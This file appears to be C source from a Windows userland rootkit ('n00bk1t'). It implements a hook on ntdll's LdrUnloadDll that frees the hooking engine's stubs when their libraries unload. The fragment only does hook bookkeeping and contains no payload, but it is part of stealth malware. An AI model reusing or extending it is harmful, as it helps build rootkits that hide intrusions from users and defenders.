#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "engine.h"
#include "misc.h"
#include "randoma.h"
#include "n00bk1t.h"

#include "ldrunloaddll.h"

extern HOOKTABLE*	HookTable;
extern HOOKTABLE	HookTableEnd;

// ntdll.LdrUnloadDll
NTSTATUS WINAPI NewLdrUnloadDll(HANDLE hModule)
{
	NTSTATUS rc;
	INT iCount;

	// call original function
	rc=OldLdrUnloadDll(hModule);
	if (NT_SUCCESS(rc))
	{
		// cleanup stubs
		for (iCount=0;iCount<sizeof(HookTable)/sizeof(HookTableEnd);iCount++)
		{
			if (!engine_NtGetModuleHandleA(HookTable[iCount].lpLibraryName)&&*(DWORD*)HookTable[iCount].lpNewFunction)
			{
				// free stub
				misc_FreeBuffer(HookTable[iCount].lpOldFunction);
				// set address of original function in process to null
				*(DWORD*)HookTable[iCount].lpOldFunction=(DWORD)NULL;
				// set size of original function to 0
				HookTable[iCount].dwOldFunctionSize=0;
				HookTable[iCount].lpFunctionAddress=NULL;
			}
		}
	}
	
	return rc;
}
